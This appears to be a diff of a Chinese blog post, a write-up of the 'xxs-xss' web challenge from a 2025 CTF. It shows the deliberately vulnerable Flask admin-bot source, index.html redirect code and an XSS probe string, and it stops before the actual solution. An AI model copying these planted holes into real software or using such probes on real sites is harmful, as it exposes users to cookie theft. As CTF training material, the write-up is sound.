@@ -1,543 +1,169 @@
-<!DOCTYPE html>
-<html lang="zh-tw">
-<head>
-    <meta charset="utf-8">
-    <meta name="viewport" content="width=device-width">
-    <script type="application/javascript" src='https://lyccyc.github.io/penguin.cyc/js/theme-mode.js'></script>
-    <link rel="stylesheet" href='https://lyccyc.github.io/penguin.cyc/css/frameworks.min.css' />
-    <link rel="stylesheet" href='https://lyccyc.github.io/penguin.cyc/css/github.min.css' />
-    <link rel="stylesheet" href='https://lyccyc.github.io/penguin.cyc/css/github-style.css' />
-    <link rel="stylesheet" href='https://lyccyc.github.io/penguin.cyc/css/light.css' />
-    <link rel="stylesheet" href='https://lyccyc.github.io/penguin.cyc/css/dark.css' />
-    <link rel="stylesheet" href='https://lyccyc.github.io/penguin.cyc/css/syntax.css' />
-    <title>CTF_xxs-xss - Penguin&#39;s blog</title>
-    
-    <link rel="icon" type="image/x-icon" href='/images/favicon.ico'>
-    
-    <meta name="theme-color" content="#1e2327">
-
-    <link rel="stylesheet" href="https://lyccyc.github.io/penguin.cyc/css/self.css">
-    
-
-    
-    <meta name="description"
-  content="xxs-xss 人生第一題破解出來的 xss，祖墳冒煙啦
+<!doctype html><html lang=zh-tw><head><meta charset=utf-8><meta name=viewport content="width=device-width"><script type=application/javascript src=https://lyccyc.github.io/penguin.cyc/js/theme-mode.js></script><link rel=stylesheet href=https://lyccyc.github.io/penguin.cyc/css/frameworks.min.css><link rel=stylesheet href=https://lyccyc.github.io/penguin.cyc/css/github.min.css><link rel=stylesheet href=https://lyccyc.github.io/penguin.cyc/css/github-style.css><link rel=stylesheet href=https://lyccyc.github.io/penguin.cyc/css/light.css><link rel=stylesheet href=https://lyccyc.github.io/penguin.cyc/css/dark.css><link rel=stylesheet href=https://lyccyc.github.io/penguin.cyc/css/syntax.css><title>CTF_xxs-xss - Penguin's blog</title><link rel=icon type=image/x-icon href=/images/favicon.ico><meta name=theme-color content="#1e2327"><link rel=stylesheet href=https://lyccyc.github.io/penguin.cyc/css/self.css><meta name=description content="xxs-xss 人生第一題破解出來的 xss，祖墳冒煙啦
 這是2025 No Hack No CTF 的 web 題目，拿來自己練習，花了一個多禮拜QQ
-" />
-<meta name="keywords"
-  content='' />
-<meta name="robots" content="noodp" />
-<link rel="canonical" href="https://lyccyc.github.io/penguin.cyc/post/ctf_xxs-xss/" />
-
-
-<meta name="twitter:card" content="summary" />
-<meta name="twitter:title" content="CTF_xxs-xss - Penguin&#39;s blog" />
-<meta name="twitter:description"
-  content="xxs-xss 人生第一題破解出來的 xss，祖墳冒煙啦
+"><meta name=keywords content><meta name=robots content="noodp"><link rel=canonical href=https://lyccyc.github.io/penguin.cyc/post/ctf_xxs-xss/><meta name=twitter:card content="summary"><meta name=twitter:title content="CTF_xxs-xss - Penguin's blog"><meta name=twitter:description content="xxs-xss 人生第一題破解出來的 xss，祖墳冒煙啦
 這是2025 No Hack No CTF 的 web 題目，拿來自己練習，花了一個多禮拜QQ
-" />
-<meta name="twitter:site" content="https://lyccyc.github.io/penguin.cyc/" />
-<meta name="twitter:creator" content="" />
-<meta name="twitter:image"
-  content="https://lyccyc.github.io/penguin.cyc/">
-
-
-<meta property="og:type" content="article" />
-<meta property="og:title" content="CTF_xxs-xss - Penguin&#39;s blog">
-<meta property="og:description"
-  content="xxs-xss 人生第一題破解出來的 xss，祖墳冒煙啦
+"><meta name=twitter:site content="https://lyccyc.github.io/penguin.cyc/"><meta name=twitter:creator content><meta name=twitter:image content="https://lyccyc.github.io/penguin.cyc/"><meta property="og:type" content="article"><meta property="og:title" content="CTF_xxs-xss - Penguin's blog"><meta property="og:description" content="xxs-xss 人生第一題破解出來的 xss，祖墳冒煙啦
 這是2025 No Hack No CTF 的 web 題目，拿來自己練習，花了一個多禮拜QQ
-" />
-<meta property="og:url" content="https://lyccyc.github.io/penguin.cyc/post/ctf_xxs-xss/" />
-<meta property="og:site_name" content="CTF_xxs-xss" />
-<meta property="og:image"
-  content="https://lyccyc.github.io/penguin.cyc/">
-<meta property="og:image:width" content="2048">
-<meta property="og:image:height" content="1024">
-
-<meta property="article:published_time" content="2025-09-08 12:44:13 &#43;0800 CST" />
-
-
-
-
-
-
-
-
-
-
-
-</head>
-
-
-<body>
-  <div style="position: relative">
-  <header class="Header js-details-container Details px-3 px-md-4 px-lg-5 flex-wrap flex-md-nowrap open Details--on">
-    <div class="Header-item mobile-none" style="margin-top: -4px; margin-bottom: -4px;">
-      <a class="Header-link" href="https://lyccyc.github.io/penguin.cyc/">
-        <img class="octicon" height="32" width="32" src="">
-      </a>
-    </div>
-    <div class="Header-item d-md-none">
-      <button class="Header-link btn-link js-details-target" type="button"
-        onclick="document.querySelector('#header-search').style.display = document.querySelector('#header-search').style.display == 'none'? 'block': 'none'">
-        <svg height="24" class="octicon octicon-three-bars" viewBox="0 0 16 16" version="1.1" width="24">
-          <path fill-rule="evenodd" d="M1 2.75A.75.75 0 011.75 2h12.5a.75.75 0 110 1.5H1.75A.75.75 0 011 2.75zm0 5A.75.75 0 011.75 7h12.5a.75.75 0 110 1.5H1.75A.75.75 0 011 7.75zM1.75 12a.75.75 0 100 1.5h12.5a.75.75 0 100-1.5H1.75z">
-          </path>
-        </svg>
-      </button>
-    </div>
-    <div style="display: none;" id="header-search"
-      class="Header-item Header-item--full flex-column flex-md-row width-full flex-order-2 flex-md-order-none mr-0 mr-md-3 mt-3 mt-md-0 Details-content--hidden-not-important d-md-flex">
-      <div
-        class="Header-search header-search flex-auto js-site-search position-relative flex-self-stretch flex-md-self-auto mb-3 mb-md-0 mr-0 mr-md-3 scoped-search site-scoped-search js-jump-to">
-        <div class="position-relative">
-          
-          <form target="_blank" action="https://www.google.com/search" accept-charset="UTF-8" method="get"
-            autocomplete="off">
-            <label
-              class="Header-search-label form-control input-sm header-search-wrapper p-0 js-chromeless-input-container header-search-wrapper-jump-to position-relative d-flex flex-justify-between flex-items-center">
-              <input type="text"
-                class="Header-search-input form-control input-sm header-search-input jump-to-field js-jump-to-field js-site-search-focus js-site-search-field is-clearable"
-                name="q" value="" placeholder="Search" autocomplete="off">
-              <input type="hidden" name="q" value="site:https://lyccyc.github.io/penguin.cyc/">
-            </label>
-          </form>
-          
-        </div>
-      </div>
-    </div>
-
-    <div class="Header-item Header-item--full flex-justify-center d-md-none position-relative">
-      <a class="Header-link " href="https://lyccyc.github.io/penguin.cyc/">
-        <img class="octicon octicon-mark-github v-align-middle" height="32" width="32" src="">
-      </a>
-    </div>
-    <div class="Header-item" style="margin-right: 0;">
-      <a href="javascript:void(0)" class="Header-link no-select" onclick="switchTheme()">
-        <svg style="fill: var(--color-profile-color-modes-toggle-moon);" class="no-select" viewBox="0 0 16 16"
-          version="1.1" width="16" height="16">
-          <path fill-rule="evenodd" clip-rule="evenodd"
-            d="M4.52208 7.71754C7.5782 7.71754 10.0557 5.24006 10.0557 2.18394C10.0557 1.93498 10.0392 1.68986 10.0074 1.44961C9.95801 1.07727 10.3495 0.771159 10.6474 0.99992C12.1153 2.12716 13.0615 3.89999 13.0615 5.89383C13.0615 9.29958 10.3006 12.0605 6.89485 12.0605C3.95334 12.0605 1.49286 10.001 0.876728 7.24527C0.794841 6.87902 1.23668 6.65289 1.55321 6.85451C2.41106 7.40095 3.4296 7.71754 4.52208 7.71754Z">
-          </path>
-        </svg>
-      </a>
-    </div>
-  </header>
-</div>
-
-  <div id="search-result" class="container-lg px-3 new-discussion-timeline" style="display: none;">
-</div>
-
-  
-<div class="application-main">
-  <div>
-  <main>
-    <div class="gisthead pagehead bg-gray-light pb-0 pt-3 mb-4">
-      <div class="px-0">
-        <div class="mb-3 d-flex px-3 px-md-3 px-lg-5">
-          <div class="flex-auto min-width-0 width-fit mr-3">
-            <div class="d-flex">
-              <div class="d-none d-md-block">
-                <a class="avatar mr-2 flex-shrink-0" href="https://lyccyc.github.io/penguin.cyc/">
-                  <img class=" avatar-user"
-                    src="/images/penguin.png"
-                    width="32" height="32"></a>
-              </div>
-              <div class="d-flex flex-column">
-                <h1 class="break-word f3 text-normal mb-md-0 mb-1">
-                  <span class="author">
-                    <a href="https://lyccyc.github.io/penguin.cyc/">陳昱臻(企鵝)</a>
-                  </span>
-                  <span class="path-divider">/</span>
-                  <strong class="css-truncate css-truncate-target mr-1" style="max-width: 410px">
-                    <a href="https://lyccyc.github.io/penguin.cyc/post/ctf_xxs-xss/">CTF_xxs-xss</a>
-                  </strong>
-                </h1>
-                <div class="note m-0">
-                  Created <relative-time datetime="Mon, 08 Sep 2025 12:44:13 &#43;0800"
-                    class="no-wrap">
-                    Mon, 08 Sep 2025 12:44:13 &#43;0800</relative-time>
-
-                  
-                </div>
-              </div>
-            </div>
-          </div>
-        </div>
-      </div>
-    </div>
-
-    <div class="container-lg px-3 new-discussion-timeline">
-      <div class="repository-content gist-content">
-        <div>
-          <div class="js-gist-file-update-container js-task-list-container file-box">
-            <div id="file-pytest" class="file my-2">
-              <div id="post-header" class="file-header d-flex flex-md-items-center flex-items-start sticky-header" style="z-index: 2">
-                <div class="file-info d-flex flex-md-items-center flex-items-start flex-order-1 flex-auto">
-                  <div class="text-mono f6 flex-auto pr-3 flex-order-2 flex-md-order-1 mt-2 mt-md-0">
-                    
-                    <summary id="toc-toggle" onclick="clickToc()" class="btn btn-octicon m-0 mr-2 p-2">
-                      <svg aria-hidden="true" viewBox="0 0 16 16" height="16" width="16" class="octicon octicon-list-unordered">
-                        <path fill-rule="evenodd" d="M2 4a1 1 0 100-2 1 1 0 000 2zm3.75-1.5a.75.75 0 000 1.5h8.5a.75.75 0 000-1.5h-8.5zm0 5a.75.75 0 000 1.5h8.5a.75.75 0 000-1.5h-8.5zm0 5a.75.75 0 000 1.5h8.5a.75.75 0 000-1.5h-8.5zM3 8a1 1 0 11-2 0 1 1 0 012 0zm-1 6a1 1 0 100-2 1 1 0 000 2z"></path>
-                      </svg>
-                    </summary>
-                    <details-menu class="SelectMenu" id="toc-details" style="display: none;">
-                      <div class="SelectMenu-modal rounded-3 mt-1" style="max-height: 340px;">
-                        <div class="SelectMenu-list SelectMenu-list--borderless p-2" style="overscroll-behavior: contain;" id="toc-list">
-                        </div>
-                      </div>
-                    </details-menu>
-                      1681 Words
-                    
-
-                  </div>
-                  <div class="file-actions flex-order-2 pt-0">
-                    
-                    
-                    <a class="muted-link mr-3" href="/tags/ctf">
-                      <svg class="octicon octicon-tag" viewBox="0 0 16 16" version="1.1" width="16" height="16">
-                        <path fill-rule="evenodd"
-                          d="M2.5 7.775V2.75a.25.25 0 01.25-.25h5.025a.25.25 0 01.177.073l6.25 6.25a.25.25 0 010 .354l-5.025 5.025a.25.25 0 01-.354 0l-6.25-6.25a.25.25 0 01-.073-.177zm-1.5 0V2.75C1 1.784 1.784 1 2.75 1h5.025c.464 0 .91.184 1.238.513l6.25 6.25a1.75 1.75 0 010 2.474l-5.026 5.026a1.75 1.75 0 01-2.474 0l-6.25-6.25A1.75 1.75 0 011 7.775zM6 5a1 1 0 100 2 1 1 0 000-2z">
-                        </path>
-                      </svg>
-                      CTF
-                    </a>
-                    
-                    <a class="muted-link mr-3" href="/tags/website">
-                      <svg class="octicon octicon-tag" viewBox="0 0 16 16" version="1.1" width="16" height="16">
-                        <path fill-rule="evenodd"
-                          d="M2.5 7.775V2.75a.25.25 0 01.25-.25h5.025a.25.25 0 01.177.073l6.25 6.25a.25.25 0 010 .354l-5.025 5.025a.25.25 0 01-.354 0l-6.25-6.25a.25.25 0 01-.073-.177zm-1.5 0V2.75C1 1.784 1.784 1 2.75 1h5.025c.464 0 .91.184 1.238.513l6.25 6.25a1.75 1.75 0 010 2.474l-5.026 5.026a1.75 1.75 0 01-2.474 0l-6.25-6.25A1.75 1.75 0 011 7.775zM6 5a1 1 0 100 2 1 1 0 000-2z">
-                        </path>
-                      </svg>
-                      Website
-                    </a>
-                    
-                    <a class="muted-link mr-3" href="/tags/docker">
-                      <svg class="octicon octicon-tag" viewBox="0 0 16 16" version="1.1" width="16" height="16">
-                        <path fill-rule="evenodd"
-                          d="M2.5 7.775V2.75a.25.25 0 01.25-.25h5.025a.25.25 0 01.177.073l6.25 6.25a.25.25 0 010 .354l-5.025 5.025a.25.25 0 01-.354 0l-6.25-6.25a.25.25 0 01-.073-.177zm-1.5 0V2.75C1 1.784 1.784 1 2.75 1h5.025c.464 0 .91.184 1.238.513l6.25 6.25a1.75 1.75 0 010 2.474l-5.026 5.026a1.75 1.75 0 01-2.474 0l-6.25-6.25A1.75 1.75 0 011 7.775zM6 5a1 1 0 100 2 1 1 0 000-2z">
-                        </path>
-                      </svg>
-                      Docker
-                    </a>
-                    
-                    
-                  </div>
-                </div>
-              </div>
-
-
-              <div class="Box-body px-5 pb-5" style="z-index: 1">
-                <article class="markdown-body entry-content container-lg"><h1 id="xxs-xss">xxs-xss</h1>
-<blockquote>
-<p>人生第一題破解出來的 xss，祖墳冒煙啦</p></blockquote>
-<p>這是2025 No Hack No CTF 的 web 題目，拿來自己練習，花了一個多禮拜QQ</p>
-<h2 id="description">Description</h2>
-<p>用 Docker 架起來後連線到 http://localhost:21337/</p>
-<p>頁面顯示如下</p>
-<p><img src="/images/xxs-xss-guest.png" alt="xxs-xss-guest"></p>
-<p>hmmm，甚麼都沒有</p>
-<h2 id="solution">Solution</h2>
-<p>根據題目給的 source code，先去觀察 <code>app.py</code></p>
-<details open><summary>app.py 程式碼</summary>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-py" data-lang="py"><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">flask</span> <span class="kn">import</span> <span class="n">Flask</span><span class="p">,</span> <span class="n">request</span><span class="p">,</span> <span class="n">jsonify</span><span class="p">,</span> <span class="n">abort</span><span class="p">,</span> <span class="n">redirect</span><span class="p">,</span> <span class="n">session</span><span class="p">,</span> <span class="n">render_template</span><span class="p">,</span> <span class="n">make_response</span>
-</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">subprocess</span>
-</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">threading</span>
-</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">hashlib</span>
-</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">os</span>
-</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">time</span>
-</span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl"><span class="n">app</span> <span class="o">=</span> <span class="n">Flask</span><span class="p">(</span><span class="vm">__name__</span><span class="p">)</span>
-</span></span><span class="line"><span class="cl"><span class="n">app</span><span class="o">.</span><span class="n">secret_key</span> <span class="o">=</span> <span class="n">os</span><span class="o">.</span><span class="n">urandom</span><span class="p">(</span><span class="mi">16</span><span class="p">)</span>
-</span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl"><span class="n">FLAG</span> <span class="o">=</span> <span class="s1">&#39;NHNC</span><span class="si">{FAKE_FLAG}</span><span class="s1">&#39;</span> 
-</span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">terminate_process</span><span class="p">(</span><span class="n">process</span><span class="p">):</span>
-</span></span><span class="line"><span class="cl">    <span class="n">process</span><span class="o">.</span><span class="n">terminate</span><span class="p">()</span>
-</span></span><span class="line"><span class="cl">    <span class="nb">print</span><span class="p">(</span><span class="s2">&#34;Process terminated after 20 seconds.&#34;</span><span class="p">)</span>
-</span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl"><span class="nd">@app.route</span><span class="p">(</span><span class="s1">&#39;/get_challenge&#39;</span><span class="p">,</span> <span class="n">methods</span><span class="o">=</span><span class="p">[</span><span class="s1">&#39;GET&#39;</span><span class="p">])</span>
-</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">get_challenge</span><span class="p">():</span>
-</span></span><span class="line"><span class="cl">    <span class="n">challenge</span> <span class="o">=</span> <span class="n">os</span><span class="o">.</span><span class="n">urandom</span><span class="p">(</span><span class="mi">8</span><span class="p">)</span><span class="o">.</span><span class="n">hex</span><span class="p">()</span>
-</span></span><span class="line"><span class="cl">    <span class="n">session</span><span class="p">[</span><span class="s1">&#39;challenge&#39;</span><span class="p">]</span> <span class="o">=</span> <span class="n">challenge</span>
-</span></span><span class="line"><span class="cl">    <span class="n">session</span><span class="p">[</span><span class="s1">&#39;ts&#39;</span><span class="p">]</span> <span class="o">=</span> <span class="n">time</span><span class="o">.</span><span class="n">time</span><span class="p">()</span>
-</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">jsonify</span><span class="p">({</span>
-</span></span><span class="line"><span class="cl">        <span class="s2">&#34;challenge&#34;</span><span class="p">:</span> <span class="n">challenge</span><span class="p">,</span>
-</span></span><span class="line"><span class="cl">        <span class="s2">&#34;description&#34;</span><span class="p">:</span> <span class="s2">&#34;Find a nonce such that SHA256(challenge + nonce) starts with 000000&#34;</span>
-</span></span><span class="line"><span class="cl">    <span class="p">})</span>
-</span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl"><span class="nd">@app.route</span><span class="p">(</span><span class="s1">&#39;/visit&#39;</span><span class="p">,</span> <span class="n">methods</span><span class="o">=</span><span class="p">[</span><span class="s1">&#39;GET&#39;</span><span class="p">])</span>
-</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">visit</span><span class="p">():</span>
-</span></span><span class="line"><span class="cl">    <span class="n">url</span> <span class="o">=</span> <span class="n">request</span><span class="o">.</span><span class="n">args</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s1">&#39;url&#39;</span><span class="p">)</span>
-</span></span><span class="line"><span class="cl">    <span class="n">nonce</span> <span class="o">=</span> <span class="n">request</span><span class="o">.</span><span class="n">args</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s1">&#39;nonce&#39;</span><span class="p">)</span>
-</span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="ow">not</span> <span class="n">url</span> <span class="ow">or</span> <span class="ow">not</span> <span class="n">nonce</span><span class="p">:</span>
-</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="s2">&#34;Missing url or nonce&#34;</span><span class="p">,</span> <span class="mi">400</span>
-</span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="ow">not</span> <span class="n">url</span><span class="o">.</span><span class="n">startswith</span><span class="p">(</span><span class="s1">&#39;http://localhost:5000/&#39;</span><span class="p">):</span>
-</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="s2">&#34;Bad Hacker&#34;</span><span class="p">,</span> <span class="mi">400</span>
-</span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl">    <span class="n">challenge</span> <span class="o">=</span> <span class="n">session</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s1">&#39;challenge&#39;</span><span class="p">)</span>
-</span></span><span class="line"><span class="cl">    <span class="n">ts</span> <span class="o">=</span> <span class="n">session</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s1">&#39;ts&#39;</span><span class="p">)</span>
-</span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="ow">not</span> <span class="n">challenge</span> <span class="ow">or</span> <span class="ow">not</span> <span class="n">ts</span><span class="p">:</span>
-</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="s2">&#34;No challenge in session. Please request /get_challenge first.&#34;</span><span class="p">,</span> <span class="mi">400</span>
-</span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="n">time</span><span class="o">.</span><span class="n">time</span><span class="p">()</span> <span class="o">-</span> <span class="n">ts</span> <span class="o">&gt;</span> <span class="mi">60</span><span class="p">:</span>
-</span></span><span class="line"><span class="cl">        <span class="n">session</span><span class="o">.</span><span class="n">pop</span><span class="p">(</span><span class="s1">&#39;challenge&#39;</span><span class="p">,</span> <span class="kc">None</span><span class="p">)</span>
-</span></span><span class="line"><span class="cl">        <span class="n">session</span><span class="o">.</span><span class="n">pop</span><span class="p">(</span><span class="s1">&#39;ts&#39;</span><span class="p">,</span> <span class="kc">None</span><span class="p">)</span>
-</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="s2">&#34;Challenge expired. Please request a new one.&#34;</span><span class="p">,</span> <span class="mi">400</span>
-</span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl">    <span class="n">h</span> <span class="o">=</span> <span class="n">hashlib</span><span class="o">.</span><span class="n">sha256</span><span class="p">((</span><span class="n">challenge</span> <span class="o">+</span> <span class="n">nonce</span><span class="p">)</span><span class="o">.</span><span class="n">encode</span><span class="p">())</span><span class="o">.</span><span class="n">hexdigest</span><span class="p">()</span>
-</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="ow">not</span> <span class="n">h</span><span class="o">.</span><span class="n">startswith</span><span class="p">(</span><span class="s2">&#34;000000&#34;</span><span class="p">):</span>
-</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="s2">&#34;Invalid PoW&#34;</span><span class="p">,</span> <span class="mi">400</span>
-</span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl">    <span class="c1"># No reuse of PoW</span>
-</span></span><span class="line"><span class="cl">    <span class="n">session</span><span class="o">.</span><span class="n">pop</span><span class="p">(</span><span class="s1">&#39;challenge&#39;</span><span class="p">,</span> <span class="kc">None</span><span class="p">)</span>
-</span></span><span class="line"><span class="cl">    <span class="n">session</span><span class="o">.</span><span class="n">pop</span><span class="p">(</span><span class="s1">&#39;ts&#39;</span><span class="p">,</span> <span class="kc">None</span><span class="p">)</span>
-</span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl">    <span class="n">process</span> <span class="o">=</span> <span class="n">subprocess</span><span class="o">.</span><span class="n">Popen</span><span class="p">([</span><span class="s1">&#39;chromium&#39;</span><span class="p">,</span> <span class="n">url</span><span class="p">,</span> <span class="s1">&#39;--headless&#39;</span><span class="p">,</span> <span class="s1">&#39;--disable-gpu&#39;</span><span class="p">,</span> <span class="s1">&#39;--no-sandbox&#39;</span><span class="p">],</span>
-</span></span><span class="line"><span class="cl">                               <span class="n">stdout</span><span class="o">=</span><span class="n">subprocess</span><span class="o">.</span><span class="n">DEVNULL</span><span class="p">,</span> <span class="n">stderr</span><span class="o">=</span><span class="n">subprocess</span><span class="o">.</span><span class="n">DEVNULL</span><span class="p">)</span>
-</span></span><span class="line"><span class="cl">    <span class="n">timer</span> <span class="o">=</span> <span class="n">threading</span><span class="o">.</span><span class="n">Timer</span><span class="p">(</span><span class="mi">20</span><span class="p">,</span> <span class="n">terminate_process</span><span class="p">,</span> <span class="p">[</span><span class="n">process</span><span class="p">])</span>
-</span></span><span class="line"><span class="cl">    <span class="n">timer</span><span class="o">.</span><span class="n">start</span><span class="p">()</span>
-</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="s2">&#34;Admin is visiting your page!&#34;</span>
-</span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl"><span class="nd">@app.route</span><span class="p">(</span><span class="s1">&#39;/&#39;</span><span class="p">,</span> <span class="n">methods</span><span class="o">=</span><span class="p">[</span><span class="s1">&#39;GET&#39;</span><span class="p">])</span>
-</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">main</span><span class="p">():</span>
-</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="n">request</span><span class="o">.</span><span class="n">remote_addr</span> <span class="o">==</span> <span class="s1">&#39;127.0.0.1&#39;</span><span class="p">:</span>
-</span></span><span class="line"><span class="cl">        <span class="n">resp</span> <span class="o">=</span> <span class="n">make_response</span><span class="p">(</span><span class="n">render_template</span><span class="p">(</span><span class="s1">&#39;index.html&#39;</span><span class="p">))</span>
-</span></span><span class="line"><span class="cl">        <span class="n">resp</span><span class="o">.</span><span class="n">set_cookie</span><span class="p">(</span><span class="s1">&#39;flag&#39;</span><span class="p">,</span> <span class="n">FLAG</span><span class="p">)</span>
-</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="n">resp</span>
-</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">render_template</span><span class="p">(</span><span class="s1">&#39;index.html&#39;</span><span class="p">)</span>
-</span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl"><span class="k">if</span> <span class="vm">__name__</span> <span class="o">==</span> <span class="s1">&#39;__main__&#39;</span><span class="p">:</span>
-</span></span><span class="line"><span class="cl">    <span class="n">app</span><span class="o">.</span><span class="n">run</span><span class="p">(</span><span class="n">host</span><span class="o">=</span><span class="s1">&#39;0.0.0.0&#39;</span><span class="p">,</span> <span class="n">port</span><span class="o">=</span><span class="mi">5000</span><span class="p">)</span>
-</span></span></code></pre></div></details>
-<p>說明一下 <code>app.py</code> 整體流程:</p>
-<ol>
-<li>首先要去 <code>/get_challenge</code> 拿隨機字串 challenge</li>
-<li>爆破解出符合條件的 nonce (用題目給的 solve_pow.py)</li>
-<li>透過訪問 <code>/visit</code> 取得兩個參數 : url 和 nonce</li>
-<li>檢查條件 :
-<ol>
-<li>如果沒有 url 或是 nonce 參數，返回: <code>Missing url or nonce</code></li>
-<li>如果 url 不是以 <code>http://localhost:5000/</code> 開頭，返回 : <code>Bad Hacker</code></li>
-<li>如果使用者的 session 有沒有 challenge 或 ts(時間戳)，返回 : <code>No challenge in session. Please request /get_challenge first.</code></li>
-<li>challenge 的有效時間只有 60 秒，若超時則返回 : <code>challenge expired. Please request a new one.</code></li>
-<li>(challenge + nonce) 的 SHA256 雜湊值如果不是以 <code>000000</code> 開頭，返回 : <code>Invalid PoW</code></li>
-</ol>
-</li>
-<li>啟動一個 Chromium 瀏覽器，訪問指定的 url，並且只執行 20 秒，時間到就關閉</li>
-<li>如果是用 Bot 訪問瀏覽器打開 url，就渲染 <code>index.html</code> 這個網頁，並把 flag 設在 cookie 裡面</li>
-</ol>
-<p>再來看一下 <code>index.html</code> 做了甚麼</p>
-<details open> <summary>index.html 程式碼</summary>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-js" data-lang="js"><span class="line"><span class="cl"><span class="o">&lt;</span><span class="nx">script</span><span class="o">&gt;</span>
-</span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl">    <span class="kd">function</span> <span class="nx">getQueryParam</span><span class="p">(</span><span class="nx">key</span><span class="p">)</span> <span class="p">{</span>
-</span></span><span class="line"><span class="cl">      <span class="kr">const</span> <span class="nx">params</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">URLSearchParams</span><span class="p">(</span><span class="nb">window</span><span class="p">.</span><span class="nx">location</span><span class="p">.</span><span class="nx">search</span><span class="p">);</span>
-</span></span><span class="line"><span class="cl">      <span class="k">return</span> <span class="nx">params</span><span class="p">.</span><span class="nx">get</span><span class="p">(</span><span class="nx">key</span><span class="p">)</span> <span class="o">||</span> <span class="s1">&#39;&#39;</span><span class="p">;</span>
-</span></span><span class="line"><span class="cl">    <span class="p">}</span>
-</span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl">    <span class="kr">const</span> <span class="nx">name</span> <span class="o">=</span> <span class="nx">getQueryParam</span><span class="p">(</span><span class="s1">&#39;name&#39;</span><span class="p">);</span>
-</span></span><span class="line"><span class="cl">    <span class="kr">const</span> <span class="nx">targetUrl</span> <span class="o">=</span> <span class="nx">getQueryParam</span><span class="p">(</span><span class="s1">&#39;url&#39;</span><span class="p">);</span>
-</span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl">    <span class="kr">const</span> <span class="nx">display</span> <span class="o">=</span> <span class="nb">document</span><span class="p">.</span><span class="nx">getElementById</span><span class="p">(</span><span class="s1">&#39;displayName&#39;</span><span class="p">);</span>
-</span></span><span class="line"><span class="cl">    <span class="nx">display</span><span class="p">.</span><span class="nx">textContent</span> <span class="o">=</span> <span class="nx">name</span> <span class="o">||</span> <span class="s1">&#39;Guest&#39;</span><span class="p">;</span>
-</span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl">    <span class="nx">setTimeout</span><span class="p">(()</span> <span class="p">=&gt;</span> <span class="p">{</span>
-</span></span><span class="line"><span class="cl">      <span class="k">if</span> <span class="p">(</span><span class="nx">targetUrl</span> <span class="o">&amp;&amp;</span> <span class="nx">targetUrl</span><span class="p">.</span><span class="nx">length</span><span class="o">&lt;=</span><span class="mi">15</span><span class="p">)</span> <span class="p">{</span>
-</span></span><span class="line"><span class="cl">        <span class="nb">window</span><span class="p">.</span><span class="nx">location</span><span class="p">.</span><span class="nx">href</span> <span class="o">=</span> <span class="nx">targetUrl</span><span class="p">;</span>
-</span></span><span class="line"><span class="cl">      <span class="p">}</span>
-</span></span><span class="line"><span class="cl">    <span class="p">},</span> <span class="mi">3000</span><span class="p">);</span>
-</span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl">    
-</span></span><span class="line"><span class="cl">  <span class="o">&lt;</span><span class="err">/script&gt;</span>
-</span></span></code></pre></div></details>
-<p>以上是他的 JS 部分，一樣說明一下做了甚麼</p>
-<ol>
-<li>name 的部分採用 textContent -&gt; 任何的程式碼都會變成純文字
-<ol>
-<li>例如 : <code>?name=&lt;script&gt;alert(1)&lt;/script&gt;</code> 也不會執行</li>
-</ol>
-</li>
-<li>targetUrl 的值是從 url 來的，但長度需要不大於15，會在 3 秒後觸發 redirect</li>
-</ol>
-<hr>
-<p>好了，知道整個頁面怎麼運作了，剩下就是如何打出 xss</p>
-<p>在 <a href="https://blog.huli.tw/2021/09/26/what-is-open-redirect/">在做跳轉功能時應該注意的問題：Open Redirect</a> 這篇文章中看到一個重點 :</p>
-<p><img src="/images/xxs-xss-redirection.png" alt="xxs-xss-redirection"></p>
